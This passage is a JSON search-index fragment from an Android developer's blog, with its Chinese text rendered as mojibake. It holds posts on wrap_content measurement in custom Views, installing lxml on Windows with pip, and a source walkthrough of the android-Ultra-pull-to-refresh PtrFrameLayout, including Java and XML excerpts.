çº¿è°ƒè¯•","tags":[{"name":"android","slug":"android","permalink":"https://haldir65.github.io/tags/android/"},{"name":"adb","slug":"adb","permalink":"https://haldir65.github.io/tags/adb/"}]},{"title":"wrap_contentåˆ°åº•å¤šå¤§","date":"2016-11-27T16:46:44.000Z","path":"2016/11/27/2016-11-27-the-size-of-wrap-content/","text":"è½¬çœ¼å°±åä¸€æœˆäº†ï¼Œjavaçš„åˆ†æè¶Šæ¥è¶Šå°‘ï¼Œè™½ç„¶å¸¸å¸¸åœ¨ä¸šåŠ¡ä¸Šç¢°åˆ°ä¸å°‘å‘ã€‚ã€‚ã€‚ é—®é¢˜çš„ç”±æ¥è¿™å‘¨ç¢°åˆ°ä¸€ä¸ªéœ€è¦ç”»æ—¶é—´è½´æ ·å¼çš„è‡ªå®šä¹‰Viewçš„éœ€æ±‚ï¼Œå¤§æ¦‚åƒè¿™æ ·(å›¾ç‰‡æ¥è‡ªç½‘ç»œ)ï¼š è¦æ±‚ï¼Œå·¦ä¾§çš„åœ†å½¢èŠ‚ç‚¹å¯ä»¥è‡ªå®šä¹‰Drawableï¼Œå³ä¾§çš„æ–‡å­—é«˜åº¦éšæ–‡å­—æ•°é‡å˜åŒ–è‡ªé€‚åº”ã€‚ æƒ³æƒ³ä¹Ÿå°±æ˜¯è‡ªå®šä¹‰ViewGroupçš„é‚£ä¸€å¥—è€æ ·å­ã€‚æŠ„èµ·é”®ç›˜å°±å¼€å§‹ç ”(Copy)ç©¶(Paste)ï¼Œå†™ç€å†™ç€å‘ç°ä¸å¯¹åŠ²ï¼Œä¸»è¦çš„é—®é¢˜åŒ…æ‹¬: åœ¨onMeasureé‡Œé¢æ‹¿åˆ°çš„height == 0 , å…·ä½“ä¸€ç‚¹å°±æ˜¯:æ•´ä¸ªViewGroupåŒ…å«å¤šä¸ªItemï¼Œæ¯ä¸ªItemåŒ…æ‹¬å·¦ä¾§çš„è‡ªå®šä¹‰View(CustomView)ï¼Œé«˜åº¦æ˜¯wrap_contentï¼Œå³è¾¹çš„TextViewé«˜åº¦æ˜¯wrap_content(è‡ªé€‚åº”å˜›)ã€‚å¯æ˜¯debugæ—¶å‘ç°å·¦ä¾§çš„è‡ªå®šä¹‰Viewæ‹¿åˆ°çš„é«˜åº¦æ˜¯0ï¼Œç®€ç›´æ—¥äº†å“ˆå£«å¥‡äº†ã€‚éšåæ‹¿ç€å…³é”®è¯å»Googleæœç´¢ï¼Œè¿˜æ˜¯æ²¡æœ‰ä»€ä¹ˆæ”¶è·ã€‚ protected void onMeasure(int widthMeasureSpec, int heightMeasureSpec) { final int widthMode = MeasureSpec.getMode(widthMeasureSpec); final int heightMode = MeasureSpec.getMode(heightMeasureSpec);// è¿™é‡Œæ˜¯UNSPECIFIED, å¸¸è§„æ¦‚å¿µé‡Œwrap_contentå¯¹åº”çš„åº”è¯¥æ˜¯AT_MOST final int widthSize = MeasureSpec.getSize(widthMeasureSpec); final int heightSize = MeasureSpec.getSize(heightMeasureSpec); // å±…ç„¶ç­‰äº0 } å›é¡¾è¿™ä¸ªItemçš„å®ç°ï¼ŒItemç»§æ‰¿è‡ªRelativeLayoutï¼Œå·¦è¾¹çš„Viewæ˜¯è°ƒç”¨addView(view,RelativeLayout.Layoutparams)åŠ è¿›å»çš„,paramsè®¾ç½®äº†ä¸€äº›rulesï¼Œåƒæ˜¯AlignParentLeftè¿™ç§ï¼Œè®°å¾—ç»™å·¦è¾¹çš„Viewå’Œå³è¾¹çš„TextViewéƒ½è®¾ç½®ä¸€ä¸ªidå°±å¥½ã€‚TextViewä¹Ÿæ˜¯è¿™æ ·addViewè¿›å»çš„ã€‚åæ¥æŸ¥åˆ°äº†ç§‹ç™¾ä¸‡å¯¹äºMeasureSpecçš„ä»‹ç»ï¼Œæˆ‘æƒ³åˆ°RelativeLayoutçš„onMeasureä¼šè°ƒç”¨ä¸¤æ¬¡ï¼Œåœ¨ç¬¬ä¸€æ¬¡æµ‹é‡çš„æ—¶å€™ï¼Œå·¦è¾¹çš„Viewå’Œå³è¾¹çš„TextViewéƒ½æŠŠé«˜åº¦è®¾ç½®ä¸ºwrap_contentäº†ã€‚è¦å‘½çš„æ˜¯è¿™ä¸ªItemæœ¬èº«æ·»åŠ åˆ°UIçš„æ–¹å¼ä¹Ÿæ˜¯ç±»ä¼¼çš„addView(view,RelativeLayout.Layoutparams)æ–¹å¼ï¼Œè¿™é‡Œçš„heightä¹Ÿæ˜¯wrap_contentã€‚å³Itemæœ¬èº«é«˜åº¦éœ€è¦ç”±å…¶childå†³å®šï¼Œå·¦è¾¹çš„childå†³å®šä¸äº†ï¼Œåªæœ‰å³è¾¹çš„TextViewæ‰èƒ½å†³å®šã€‚æ‰€ä»¥ç¬¬ä¸€è½®æµ‹é‡ä¸‹æ¥ï¼Œå·¦è¾¹çš„Viewçš„é«˜åº¦åªèƒ½æ˜¯0ï¼Œå³è¾¹çš„TextViewé«˜åº¦å€’æ˜¯ç¡®å®šäº†ã€‚è¿™æ—¶å€™Itemæœ¬èº«çš„é«˜åº¦ä¹Ÿå°±èƒ½ç¡®å®šäº†ã€‚åœ¨ç¬¬äºŒéæµ‹é‡çš„æ—¶å€™ï¼Œå°±èƒ½é¡ºåˆ©æ‹¿åˆ°é«˜åº¦äº†ã€‚ å·¦ä¾§çš„æ¯ä¸ªèŠ‚ç‚¹ä¸Šçš„drawableä¸ç”»å‡ºæ¥åæ¥æŸ¥äº†ä¸‹ï¼ŒåŸå› åœ¨äºæˆ‘å¯¹ä¼ è¿›æ¥çš„drawableæ£€æŸ¥äº†å¤§å°ï¼Œå¤ªå¤§çš„è¯ç”¨ä¸€ä¸ªScaleDrawableè½¬ä¸€ä¸‹ã€‚ä½†æ˜¯ï¼ŒscaleDrawableéœ€è¦è°ƒç”¨setLevelæ–¹æ³•æ‰ä¼šdrawï¼Œæˆ‘è¿™é‡Œå·æ‡’ç›´æ¥è®¾ç½®ä¸º1äº†ã€‚ Itemæœ¬èº«æ˜¯ç»§æ‰¿è‡ªRelativeLayoutï¼Œæƒ³è¦ä½¿onDrawæ–¹æ³•è¢«è°ƒç”¨éœ€è¦åœ¨æ„é€ å‡½æ•°é‡Œè®¾ç½®setWillNotDraw(false)è¿™ä¸ªbooleanå€¼é»˜è®¤æ˜¯trueï¼Œä¸»è¦æ˜¯é¡¾åŠåˆ°æ€§èƒ½çš„åŸå› ã€‚ å‚è€ƒ How Android caculates view size","tags":[{"name":"android","slug":"android","permalink":"https://haldir65.github.io/tags/android/"}]},{"title":"Windows10å¹³å°å®‰è£…lxmlè®°å½•","date":"2016-10-31T15:49:38.000Z","path":"2016/10/31/2016-10-31-install-lxml-on-windows/","text":"å‰å‡ å¤©å°è¯•ä½¿ç”¨ä¸€ä¸ªç®€å•çš„å¾®åšçˆ¬è™«è¿›è¡Œæ“ä½œï¼Œå¯¼åŒ…çš„æ—¶å€™é‡åˆ°lxmlç¼ºå¤±çš„é—®é¢˜ï¼Œæ‰¾äº†å¥½ä¹…æœ€ç»ˆåœ¨ç™¾åº¦çŸ¥é“ä¸Šæ‰¾åˆ°ä¸ªèƒ½ç”¨çš„ï¼Œ(âŠ™ï¹âŠ™)bã€‚ 1. ç¯å¢ƒ python2.7, win10 64ä½ pip ç¯å¢ƒå˜é‡é…ç½® 2. å¼€å§‹ cmd å‘½ä»¤è¡Œæ•²å…¥ pip install wheel å‡†å¤‡lxmlå®‰è£…æ–‡ä»¶,ä¸‹è½½åœ°å€,æˆ‘çš„æ˜¯win10 64ä½ï¼Œé€‰æ‹© lxml-3.4.2-cp27-none-win_amd54.xhl ä¸‹è½½å®Œæˆåæ”¾åˆ° c:\\python27\\æ–‡ä»¶å¤¹ä¸‹ å‘½ä»¤è¡Œæ•²å…¥ pip install c:\\python27\\lxmlâ€¦(åˆšæ‰çš„æ–‡ä»¶å) æœ€åä¼šæç¤º successfully installeed lxml-3.4.2 è¿™æ—¶å€™å…³é—­pycharm projectï¼Œé‡æ–°æ‰“å¼€å°±å¯ä»¥çœ‹åˆ°å¯¼å…¥æˆåŠŸäº†ã€‚ 2018å¹´1æœˆæ›´æ–°é¦–å…ˆç¡®è®¤pipæ˜¯å¦å®‰è£…äº†lxmlï¼Œpip list(æŸ¥çœ‹å·²å®‰è£…çš„åŒ…)How to install LXML for Python 3 on 64-bit Windowså› ä¸ºå®‰è£…çš„æ˜¯python3.6ï¼Œæ‰€ä»¥ä¸‹è½½lxmlâ€‘4.1.1â€‘cp36â€‘cp36mâ€‘win32.whlè¿™ä¸ªæ–‡ä»¶win10çš„64ä½ç³»ç»Ÿåªéœ€è¦å®‰è£… lxmlâ€‘4.1.1â€‘cp36â€‘cp36mâ€‘win32.whl ,å¦‚æœå®‰è£…lxmlâ€‘4.1.1â€‘cp36â€‘cp36mâ€‘win_amd64.whlçš„è¯ï¼Œå¯èƒ½ä¼šæç¤ºfilename-whl-is-not-supported-wheel-on-this-platformï¼Œæ˜¯å› ä¸ºå®‰è£…çš„pythonæ˜¯32ä½çš„ã€‚ Ref ç™¾åº¦æœ‰æ—¶å€™ä¹Ÿæ˜¯æŒºç®¡ç”¨çš„","tags":[{"name":"python","slug":"python","permalink":"https://haldir65.github.io/tags/python/"}]},{"title":"android-Ultra-pull-to-refreshåˆ†æ","date":"2016-10-24T10:25:35.000Z","path":"2016/10/24/2016-10-24-a-peek-on-pull-to-refresh/","text":"æœ€æ—©å¼€å§‹æ¥è§¦å®‰å“çš„æ—¶å€™å°±çŸ¥é“æœ‰Chris Banesçš„Pull-To-Refreshï¼Œå½“æ—¶è¿™ä¸ªåº“å·²ç»è¢«æ ‡è®°è¢«Deprecatedäº†ï¼Œåæ¥å‡ºäºå¯»æ‰¾æ›¿ä»£å“çš„ç›®çš„æ‰¾åˆ°äº†ç§‹ç™¾ä¸‡çš„android-Ultra-pull-toRefreshï¼Œç›´æ¥ å½“æ—¶ç”šè‡³æ²¡æœ‰èƒ½åŠ›æŠŠä¸€ä¸ªDemoè·‘èµ·æ¥ã€‚ä¹‹åçš„é¡¹ç›®ä¸­ï¼Œç›´æ¥ä½¿ç”¨swipeRefreshLayoutäº†ã€‚ç°åœ¨å›å¤´çœ‹ï¼Œç»ˆäºè§‰å¾—å¯ä»¥å°è¯•ç€åˆ†æä¸€éæ•´ä¸ªä¸‹æ‹‰åˆ·æ–°çš„è¿‡ç¨‹ã€‚æœ¬æ–‡åªé’ˆå¯¹android-Ultra-pulltoRefreshéƒ¨åˆ†æºç è¿›è¡Œåˆ†æã€‚æ‹†ä¸€ä¸ªè½®å­å¯èƒ½åªéœ€è¦èŠ±ä¸€å¤©æ—¶é—´ï¼Œä½†èƒ½å¤Ÿä»æ— åˆ°æœ‰æ„æ€å‡ºè¿™ä¸ªæ¡†æ¶ï¼Œå°†é¡¹ç›®æ­å»ºèµ·æ¥å¹¶ä¸”åšæŒé•¿æœŸç»´æŠ¤çœŸçš„æ˜¯ä¸€ä»¶éœ€è¦å¾ˆå¼ºæ¯…åŠ›çš„äº‹æƒ…ï¼Œå‘ä¸ºå¼€æºç¤¾åŒºè´¡çŒ®ä¼˜ç§€ä»£ç çš„ç§‹ç™¾ä¸‡å’Œä¼—å¤šåšå‡ºè´¡çŒ®çš„å¼€å‘è€…è‡´æ•¬ã€‚ 1. ä»Demoå¼€å§‹å§ä»github cloneä¸‹æ¥ä¹‹åï¼Œæ”¹ä¸€ä¸‹gradleç‰ˆæœ¬ï¼Œcompile sdk versionä»€ä¹ˆçš„å°±å¯ä»¥è¿è¡Œé¡¹ç›®è‡ªå¸¦çš„Demoäº†.MainActivity æ·»åŠ äº†ä¸€ä¸ªPtrDemoHomeFragment,onCreateViewé‡Œé¢è¿”å›çš„Viewå¯¹åº”çš„xmlæ–‡ä»¶ä¸ºfragment_ptr_home.xml &lt;LinearLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot; android:orientation=&quot;vertical&quot;&gt; &lt;in.srain.cube.views.ptr.PtrFrameLayout android:id=&quot;@+id/fragment_ptr_home_ptr_frame&quot; xmlns:cube_ptr=&quot;http://schemas.android.com/apk/res-auto&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot; cube_ptr:ptr_duration_to_close=&quot;200&quot; cube_ptr:ptr_duration_to_close_header=&quot;1000&quot; cube_ptr:ptr_keep_header_when_refresh=&quot;true&quot; cube_ptr:ptr_pull_to_fresh=&quot;false&quot; cube_ptr:ptr_ratio_of_header_height_to_refresh=&quot;1.2&quot; cube_ptr:ptr_resistance=&quot;1.7&quot;&gt; &lt;ScrollView android:id=&quot;@+id/fragment_block_menu_scroll_view&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot; android:background=&quot;@color/cube_mints_white&quot;&gt; &lt;in.srain.cube.views.block.BlockListView android:id=&quot;@+id/fragment_block_menu_block_list&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;wrap_content&quot; android:padding=&quot;@dimen/cube_mints_content_view_padding&quot; /&gt; &lt;/ScrollView&gt; &lt;/in.srain.cube.views.ptr.PtrFrameLayout&gt; &lt;/LinearLayout&gt; é»˜è®¤ä¸»é¡µå·²ç»å¯ä»¥ä¸‹æ‹‰åˆ·æ–°äº†ï¼Œé‚£ä¹ˆä¸»è¦çš„äº‹ä»¶æ‹¦æˆªæ“ä½œåº”è¯¥å°±åœ¨è¿™ä¸ªptrFrameLayouté‡Œé¢ 2. PtrFrameLayoutæºç ä»æ³¨é‡Šæ¥çœ‹ This layout view for â€œPull to Refresh(Ptr)â€ support all of the view, you can contain everything you want. support: pull to refresh / release to refresh / auto refresh / keep header view while refreshing / hide header view while refreshing It defines {@link in.srain.cube.views.ptr.PtrUIHandler}, which allows you customize the UI easily. èƒ½å¤Ÿå®¹çº³å„ç§Viewï¼ŒåŒæ—¶æ”¯æŒä¸‹æ‹‰åˆ·æ–°ï¼Œä¸‹æ‹‰é‡Šæ”¾åˆ·æ–°ï¼Œè‡ªåŠ¨åˆ·æ–°ï¼Œåˆ·æ–°æ—¶ä¿ç•™åˆ·æ–°åŠ¨ç”»ï¼Œåˆ·æ–°æ—¶éšè—åˆ·æ–°åŠ¨ç”» ä¸€æ­¥æ­¥æ¥çœ‹ æ„é€ å‡½æ•° public class PtrFrameLayout extends ViewGroup { public PtrFrameLayout(Context context, AttributeSet attrs, int defStyle) { super(context, attrs, defStyle); //åˆ é™¤æ— å…³ä»£ç  TypedArray arr = context.obtainStyledAttributes(attrs, R.styleable.PtrFrameLayout, 0, 0); if (arr != null) { mHeaderId = arr.getResourceId(R.styleable.PtrFrameLayout_ptr_header, mHeaderId); // HeaderViewçš„layoutæ–‡ä»¶id mContainerId = arr.getResourceId(R.styleable.PtrFrameLayout_ptr_content, mContainerId); // contentViewçš„layoutæ–‡ä»¶id mDurationToClose = arr.getInt(R.styleable.PtrFrameLayout_ptr_duration_to_close, mDurationToClose);// ç»´æŒåˆ·æ–°åŠ¨ç”»å¤šä¹…å¼€å§‹å…³é—­HeaderView mDurationToCloseHeader = arr.getInt(R.styleable.PtrFrameLayout_ptr_duration_to_close_header, mDurationToCloseHeader); float ratio = mPtrIndicator.getRatioOfHeaderToHeightRefresh(); ratio = arr.getFloat(R.styleable.PtrFrameLayout_ptr_ratio_of_header_height_to_refresh, ratio); mKeepHeaderWhenRefresh = arr.getBoolean(R.styleable.PtrFrameLayout_ptr_keep_header_when_refresh, mKeepHeaderWhenRefresh); mPullToRefresh = arr.getBoolean(R.styleable.PtrFrameLayout_ptr_pull_to_fresh, mPullToRefresh); arr.recycle(); } //ViewConfigurationå¾ˆå¸¸è§äº†ï¼ŒmTouchSlopç”¨äºåˆ¤æ–­ç”¨æˆ·æ“ä½œæ‰‹åŠ¿æ˜¯å¦æœ‰æ•ˆ final ViewConfiguration conf = ViewConfiguration.get(getContext()); mPagingTouchSlop = conf.getScaledTouchSlop() * 2; } } æ„é€ å‡½æ•°é‡Œé¢ä¸»è¦å°±æ˜¯è·å¾—åœ¨xmlä¸­è®¾å®šçš„ä¸€äº›è‡ªå®šä¹‰å±æ€§çš„å€¼å¹¶ä¿å­˜ä¸ºæˆå‘˜å˜é‡ï¼Œå®é™…ç”¨é€”åé¢å†çœ‹ã€‚ onFinishInflateè¿™ä¸ªæ–¹æ³•åœ¨inflate xmlæ–‡ä»¶ç»“æŸï¼Œæ‰€æœ‰çš„childViewéƒ½å·²ç»æ·»åŠ ä¹‹åè°ƒç”¨PtrFrameLayoutå¤å†™äº†è¿™ä¸ªæ–¹æ³•ï¼Œ é¦–å…ˆæ£€æŸ¥ChildViewæ•°é‡ï¼Œå¦‚æœchildCount &gt;2 ä¼šæŠ¥é”™ ç„¶åæ£€æŸ¥ä¸¤ä¸ªchild(è¿™é‡Œä¸»è¦çœ‹childCount=2çš„æƒ…å†µä¸‹) //çœç•¥è‹¥å¹² if (child1 instanceof PtrUIHandler) { mHeaderView = child1; mContent = child2; } else if (child2 instanceof PtrUIHandler) { mHeaderView = child2; mContent = child1; } //çœç•¥è‹¥å¹² æ¥çœ‹ä¸€ä¸‹è¿™ä¸ªptrUIHandler public interface PtrUIHandler { /** * When the content view has reached top and refresh has been completed, view will be reset. * * @param frame */ public void onUIReset(PtrFrameLayout frame); /** * prepare for loading * * @param frame */ public void onUIRefreshPrepare(PtrFrameLayout frame); /** * perform refreshing UI */ public void onUIRefreshBegin(PtrFrameLayout frame); /** * perform UI after refresh */ public void onUIRefreshComplete(PtrFrameLayout frame); public void onUIPositionChange(PtrFrameLayout frame, boolean isUnderTouch, byte status, PtrIndicator ptrIndicator); } å¤§æ¦‚å¯ä»¥çŒœåˆ°è¿™è´§æ˜¯ç”¨æ¥æŒ‡å®šä¸‹æ‹‰è¿‡ç¨‹ä¸­çš„åˆ·æ–°å¼€å§‹ï¼Œåˆ·æ–°ç»“æŸï¼Œåˆ·æ–°ç»“æŸåå¤ä½ç­‰è¿‡ç¨‹çš„å®ç°è€…ï¼Œå…·ä½“çš„ä¸‹æ‹‰è¿‡ç¨‹ä¸­çš„åŠ¨ç”»ï¼Œä½ç§»ç­‰ç‰¹æ•ˆéƒ½åº”è¯¥ç”±è¿™æ¥å£çš„å®ä¾‹(View)æ¥å®Œæˆã€‚ onMeasure`java@Override protected void onMeasure(int widthMeasureSpec, int heightMeasureSpec) { super.onMeasure(widthMeasureSpec, heightMeasureSpec); //çœç•¥... measureContentView(mContent, widthMeasureSpec, heightMeasureSpec); } private void measureContentView(View child, int parentWidthMeasureSpec, int parentHeightMeasureSpec) { final MarginLayoutParams lp = (MarginLayoutParams) child.getLayoutParams(); final int childWidthMeasureSpec = getChildMeasureSpec(parentWidthMeasureSpec, getPaddingLeft() + getPaddingRight() + lp.leftMargin + lp.rightMargin, lp.width); final int childHeightMeasureSpec = getChildMeasureSpec(parentHeightMeasureSpec, getPaddingTop() + getPaddingBottom() + lp.topMargin, lp.height); child.measure(childWidthMeasureSpec, childHeightMeasureSpec); } ä¸»è¦å°±æ˜¯è°ƒç”¨äº†measureContentViewæ–¹æ³•ï¼Œéƒ½æ˜¯å¾ˆä¸­è§„ä¸­çŸ©çš„å®ç° 4. **onLayout** ä»£ç å°±ä¸è´´äº†ï¼Œæ ¹æ®LayoutParamsè®¡ç®—å‡ºéœ€è¦çš„margin,æœ€ä¸»è¦çš„Topæ˜¯ç”± &gt; int offset = mPtrIndicator.getCurrentPosY(); è·å¾—çš„ï¼ŒmPterIndicatoræ˜¯ä¸€ä¸ªå•ç‹¬çš„ç»„ä»¶ï¼Œç”¨äºä¿å­˜ä¸€äº›å®æ—¶çŠ¶æ€ã€‚ æ»‘åŠ¨è¿‡ç¨‹ä¸­å¦‚æœæœ‰åŠ¨ç”»æ•ˆæœï¼Œä¼šèµ°åˆ°è¿™ä¸ªæ–¹æ³•é‡Œï¼Œæ‰€ä»¥åŠæ—¶æ›´æ–°æœ€æ–°çš„ä½ç½®å¾ˆé‡è¦ï¼Œptrå°†è¿™ä¸€åŠŸèƒ½å‰¥ç¦»å‡ºæ¥ï¼Œè¿™å¤§æ¦‚å°±æ˜¯æˆ‘æ‰€ç†è§£çš„è§£è€¦å§ã€‚ 5. **dispatchTouchEvent** ä¸»è¦çš„æ‰‹åŠ¿å¤„ç†é€»è¾‘éƒ½åœ¨è¿™é‡Œï¼Œå…³äºTouchEventçš„åˆ†å‘å¤„ç†ï¼Œè¿™é‡Œä¸å†èµ˜è¿°ã€‚ ç®€å•åˆ—å‡ºæ‰§è¡Œé¡ºåº: &gt; ViewGroup.dispatchTouchEvent----ViewGroup.onInterceptTouchEvent---View.dispatchTouchEvent----- etc ã€ã€ã€ã€ ç®€ä¹¦ä¸Šæœ‰ä½œè€…å†™å‡ºäº†éå¸¸å¥½çš„å…³äºTouchEventåˆ†å‘çš„[æ–‡ç« ](http://www.jianshu.com/p/e99b5e8bd67b)ï¼Œå¿˜è®°äº†çš„è¯å¯ä»¥å»çœ‹çœ‹ã€‚ æ¥çœ‹è¿™éƒ¨åˆ†çš„å®ç°ï¼Œæœ‰åˆ èŠ‚ ```java @Override public boolean dispatchTouchEvent(MotionEvent e) { //..... switch (action) { case MotionEvent.ACTION_UP: case MotionEvent.ACTION_CANCEL: if (mPtrIndicator.hasLeftStartPosition()) { onRelease(false); //æ‰‹æŒ‡æŠ¬èµ·åçš„æ“ä½œ // ...... return dispatchTouchEventSupper(e); } else { return dispatchTouchEventSupper(e); } case MotionEvent.ACTION_DOWN: //å–æ¶ˆä¹‹å‰è¿˜åœ¨è¿è¡Œçš„Scrollerç­‰ç­‰ã€‚ã€‚ // The cancel event will be sent once the position is moved. // So let the event pass to children. // fix #93, #102 dispatchTouchEventSupper(e); return true;//è¿™é‡Œè¿”å›trueï¼Œchildå°†ä¼šå—åˆ°ACTION_CANCEL case MotionEvent.ACTION_MOVE: mLastMoveEvent = e; //è¿™é‡Œå®æ—¶æ›´æ–°è£…å¡« mPtrIndicator.onMove(e.getX(), e.getY()); float offsetX = mPtrIndicator.getOffsetX(); float offsetY = mPtrIndicator.getOffsetY(); boolean moveDown = offsetY &gt; 0; boolean moveUp = !moveDown; boolean canMoveUp = mPtrIndicator.hasLeftStartPosition(); // disable move when header not reach top if (moveDown &amp;&amp; mPtrHandler != null &amp;&amp; !mPtrHandler.checkCanDoRefresh(this, mContent, mHeaderView)) { return dispatchTouchEventSupper(e); } if ((moveUp &amp;&amp; canMoveUp) || moveDown) { movePos(offsetY); //å®ç°æ»‘åŠ¨æ“ä½œçš„ä»£ç  return true;// åç»­äº‹ä»¶å°†åªä¼šèµ°åˆ°æ­¤æ–¹æ³•ï¼Œä¸ä¼šå†å¾€ä¸‹ä¼ é€’ï¼Œç›´åˆ°ACTION_UPï¼Œæœ¬æ¬¡æ‰‹åŠ¿ç»“æŸ } } return dispatchTouchEventSupper(e); } ç”¨æˆ·æ‰‹æŒ‡æŒ‰ä¸‹ã€‚ã€‚ã€‚ã€‚ã€‚æ‰‹æŒ‡æ»‘åŠ¨ã€‚ã€‚ã€‚ã€‚ã€‚æ‰‹æŒ‡æŠ¬èµ· ACTION_DOWN : æ‰‹æŒ‡æŒ‰ä¸‹åå°†TouchEventäº¤ç»™mPtrIndicatorå¤„ç†ï¼Œåè€…ä¿ç•™äº†å½“å‰ptrçš„ä½ç½®ï¼Œé«˜åº¦ç­‰ä¿¡æ¯ã€‚åœ¨æ‰§è¡ŒACTION_DOWNæ—¶ï¼Œå¹¶æ²¡æœ‰ç®€å•åœ°ä½¿ç”¨Event.getYï¼Œè€Œæ˜¯ä¿ç•™äº†å½“å‰positionçš„ä¸€ä¸ªå¤‡ä»½(è¿™æ˜¯å¿…è¦çš„ï¼Œå› ä¸ºå¯¹äºä¸‹æ‹‰åˆ·æ–°æ¥è¯´ï¼Œæœ€ç»ˆéœ€è¦å›åˆ°çš„ä½ç½®æ˜¯0ï¼Œè€Œç”¨æˆ·æŒ‰ä¸‹çš„ä½ç½®å¯èƒ½åœ¨contentViewæ¯”è¾ƒé ä¸‹é¢çš„ä½ç½®ã€‚ACTION_DOWNçš„getYå¹¶æ²¡æœ‰å¤ªå¤§æ„ä¹‰)ã€‚éšåè°ƒç”¨Scrollerçš„ mScroller.forceFinished(true)æ–¹æ³•åœæ­¢æ»‘åŠ¨ï¼Œå¦‚æœå®šä¹‰äº†é¡µé¢è‡ªåŠ¨åˆ·æ–°(å°±æ˜¯è¿›æ¥ä¼šä¸‹æ‹‰åˆ·æ–°ä¸€æ¬¡)ï¼Œè¿˜ä¼šè°ƒç”¨onRelease(true)æ–¹æ³•ï¼ŒonReleaseæ–¹æ³•ä¸ACTION_UPç›¸å…³ã€‚ ACTION_MOVE : æ‰‹æŒ‡å¼€å§‹åœ¨å±å¹•ä¸Šæ»‘åŠ¨ï¼Œé¦–å…ˆå°†æ»‘åŠ¨è·ç¦»çš„æ”¹å˜ä¿ç•™åˆ°mPtrIndicatorä¸­ï¼Œè¿™é‡Œä½œè€…å°†å¾ˆå¤šåæ ‡è®¡ç®—çš„æ–¹æ³•éƒ½æ‹†å‡ºæ¥æ”¾åˆ°è¿™ä¸ªmPtrIndicatorä¸­ï¼Œæš´éœ²å‡ºgetæ–¹æ³•ï¼Œä¹Ÿä½¿å¾—ä»£ç æ›´æ¸…æ™°ã€‚åœ¨å¼€å§‹æ»‘åŠ¨ä¹‹å‰ï¼Œå…ˆæ£€æŸ¥ä¸‹æ˜¯å¦æ˜¯æ¨ªå‘æ»‘åŠ¨ï¼Œä»¥åŠæ˜¯å¦åœ¨(mDisableWhenHorizontalMoveï¼ŒViewPageréœ€è¦æ¶ˆè´¹æ¨ªå‘æ‰‹åŠ¿ï¼Œè¿™ä¸ªæ ‡å¿—ç¬¦æ˜¯ä¸ºäº†return super)ã€‚å¾€ä¸‹èµ°ï¼Œæ¥çœ‹è¿™ä¸€æ®µ boolean moveDown = offsetY &gt; 0; æ–°çš„Eventä¸­çš„yå€¼å’ŒmptrIndicatorä¸­ä¿ç•™çš„å½“å‰yçš„å·®å€¼ï¼Œæ‰€ä»¥æ‰‹æŒ‡å¾€ä¸‹æ‹‰çš„è¯ï¼Œoffset &gt;0,ä¹Ÿå°±æ˜¯è¿™é‡Œçš„moveDown boolean moveUp = !moveDown; boolean canMoveUp = mPtrIndicator.hasLeftStartPosition()// æ£€æŸ¥ä¸‹å½“å‰Eventä¸­çš„yæ˜¯å¦å¤§äº0ï¼Œå³å†…å®¹åŒºåŸŸæ˜¯å¦å·²ç»å¾€ä¸‹èµ°äº†ä¸€ç‚¹äº† æ¥ä¸‹æ¥ï¼Œå†æ¬¡è¯¢é—®mPtrHandlerèƒ½å¦DoRefresh,å°†è‡ªèº«å’ŒChildViewéƒ½äº¤å‡ºå»ï¼Œæ‰€ä»¥å¯æ“ä½œæ€§å¾ˆå¤§å¤§éƒ¨åˆ†çš„æƒ…å†µä¸‹ï¼Œç›´æ¥ä½¿ç”¨ä¸€ä¸ª return PtrDefaultHandler.checkContentCanBePulledDown(frame, content, header); ä½¿ç”¨äº†ä¸€ä¸ªç±»ä¼¼äºViewCompat.canScollVerticallyçš„æ–¹æ³•ï¼Œä½†åˆ¤æ–­ä¸‹å¦‚æœæ˜¯AbstractListViewçš„è¯ï¼Œä¼šè°ƒç”¨getFirstVisiblePositionç­‰æ–¹æ³•ï¼Œå› ä¸ºAdapterViewèƒ½å¦æ»‘åŠ¨åº”è¯¥æ˜¯ç”±å…¶å†…å®¹èƒ½å¦æ»‘åŠ¨æ¥å†³å®šçš„ã€‚å¦‚æœè¿™ä¸ªæ–¹æ³•è¿”å›trueã€‚æ¥ç€å¾€ä¸‹èµ°ï¼Œå¼€å§‹æ‰§è¡ŒViewçš„æ»‘åŠ¨æ–¹æ³•:åˆ¤æ–­ä¸‹æ˜¯å¦æ‰‹æŒ‡åœ¨å¾€ä¸Šæ‹‰(moveUp &amp;&amp; canMoveUp)æˆ–è€…å¾€ä¸‹æ‹‰(moveDown),return trueï¼Œé¦–å…ˆäº‹ä»¶å°±ä¸ä¼šå†å¾€ä¸‹èµ°ï¼Œå¦å¤–åç»­çš„ACTION_MOVE_ACTION_UPéƒ½åªä¼šä¼ é€’åˆ°è¿™ä¸ªdispatchTouchEventä¸­å®ç°æ»‘åŠ¨æ“ä½œçš„ä»£ç æœ€åä¼šæ‰§è¡Œè¿™é‡Œ private void updatePos(int change) { boolean isUnderTouch = mPtrIndicator.isUnderTouch(); // once moved, cancel event will be sent to child if (isUnderTouch &amp;&amp; !mHasSendCancelEvent &amp;&amp; mPtrIndicator.hasMovedAfterPressedDown()) { mHasSendCancelEvent = true; sendCancelEvent(); } // leave initiated position or just refresh complete if ((mPtrIndicator.hasJustLeftStartPosition() &amp;&amp; mStatus == PTR_STATUS_INIT) || (mPtrIndicator.goDownCrossFinishPosition() &amp;&amp; mStatus == PTR_STATUS_COMPLETE &amp;&amp; isEnabledNextPtrAtOnce())) { mStatus = PTR_STATUS_PREPARE; 